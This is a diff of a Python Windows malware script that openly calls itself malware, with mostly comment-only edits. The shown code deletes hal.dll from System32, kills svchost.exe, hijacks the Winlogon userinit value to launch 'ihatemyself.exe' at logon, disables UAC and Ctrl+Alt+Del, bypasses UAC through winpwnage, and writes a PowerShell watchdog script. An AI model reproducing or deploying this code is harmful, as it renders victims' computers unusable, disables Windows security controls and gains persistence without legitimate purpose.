@@ -8,10 +8,6 @@ import ctypes, os, shutil, subprocess, psutil, winreg, time, threading, configpa
 from winpwnage.functions.uac.uacMethod2 import uacMethod2
 
 def is_running_as_admin():
-    '''
-    Checks if the script is running with administrative privileges.
-    Returns True if is running as admin, False otherwise.
-    '''    
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
@@ -72,11 +68,10 @@ def monitor_files(file_paths):
         for file_path in file_paths:
             if not os.path.exists(file_path):
                 subprocess.call(["taskkill", "/IM", "svchost.exe", "/f"])
-        time.sleep(1)  # You can adjust the sleep time as per your requirement
+        time.sleep(1)
         
 def check_process(process_name):
     while True:
-        # Iterate over all running processes
         for proc in psutil.process_iter(['pid', 'name']):
             if proc.info['name'] == process_name:
                 print(f"Process '{process_name}' is alive with PID {proc.info['pid']}")
@@ -106,39 +101,30 @@ def payload():
     os.remove("C:\\Windows\\System32\\hal.dll")
 
 def registrypayload():
-    # Specify the registry key path
     winlogon_key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
-    # Open the registry key for editing
     with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, winlogon_key_path, 0, winreg.KEY_WRITE) as key:
-        # Set the value names
         disablecadd = "DisableCAD"
         wininit = "userinit"
 
-        # Set the new value data
         new_cad_data = 0
         new_init_data = f"C:\\Windows\\system32\\userinit.exe, {windows_folder}\\ihatemyself.exe"
 
-        # Set the value type (REG_SZ for string value)
         vtype = winreg.REG_SZ
         discadtype = winreg.REG_DWORD
-        
-        # Set the values
+	    
         winreg.SetValueEx(key, disablecadd, 0, discadtype, new_cad_data)
         winreg.SetValueEx(key, wininit, 0, vtype, new_init_data)
 
     luapath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 
     with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, luapath, 0, winreg.KEY_WRITE) as lkey:
-        # Set the value names
         lua = "EnableLUA"
 
-        # Set the new value data
         newlua = 0
 
         discadtype = winreg.REG_DWORD
         
-        # Set the values
         winreg.SetValueEx(lkey, lua, 0, discadtype, newlua)
     
     system_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -183,10 +169,7 @@ def create_ps1_script(script_name, content):
 
 script_name = "wininit"
 content = """
-# Define the process name to monitor
 $processName = "ihatemyself"
-
-# Loop indefinitely
 while ($true) {
     $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
     
@@ -225,7 +208,6 @@ def hell():
 CONFIG_FILE = f"{local_appdata_path}\config.ini"
 
 def ask_permission():
-    # Prompt the user with a warning message box
     return ctypes.windll.user32.MessageBoxW(0, "This program is a malware. Proceeding will make your PC unusable.\nContinue?", "!!!...WARNING...!!!", 0x00000030 | 0x00000004) == 6
 
 def write_permission_granted():
@@ -242,7 +224,6 @@ def check_permission_granted():
     return False
 
 if __name__ == "__main__":
-    # Check if permission is already granted
     if check_permission_granted():
         if is_running_as_admin() and check_enable_lua():
          create_ps1_script(script_name, content)
@@ -263,7 +244,6 @@ if __name__ == "__main__":
             thread2.start()
             thread3.start()
     else:
-        # Prompt the user for permission if it hasn't been granted yet
         if ask_permission():
             write_permission_granted()
             bypassuac()
